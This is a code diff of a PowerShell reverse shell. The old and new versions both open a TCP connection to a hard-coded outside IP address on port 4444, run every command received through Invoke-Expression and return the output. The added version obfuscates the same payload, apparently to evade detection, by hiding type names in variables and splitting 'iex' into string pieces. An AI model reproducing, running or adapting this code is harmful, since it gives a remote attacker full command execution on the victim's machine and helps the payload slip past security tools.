@@ -1,16 +1,11 @@
-$ip = "134.209.113.62"
-$port = 4444
-
-$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-
-while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-    $sendback = (iex $data 2>&1 | Out-String )
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-    $stream.Write($sendbyte, 0, $sendbyte.Length)
-    $stream.Flush()
-}
-$client.Close()
+$h='System.Net.Sockets.TCPClient';$a='System.Text.ASCIIEncoding';
+$i = "134.209.113.62";$p = 4444
+$c=New-Object ($h) ($i,$p);$s=$c.GetStream()
+$b=0..65535|%{0}
+while(($r=$s.Read($b,0,$b.Length)) -ne 0){
+$d=(New-Object ($a)).GetString($b,0,$r)
+$t=&('ie'+'x') $d 2>&1 | Out-String
+$t2=$t + ('PS ' + (pwd).Path + '> ')
+$m=[Text.Encoding]::ASCII.GetBytes($t2)
+$s.Write($m,0,$m.Length);$s.Flush()
+};$c.Close()
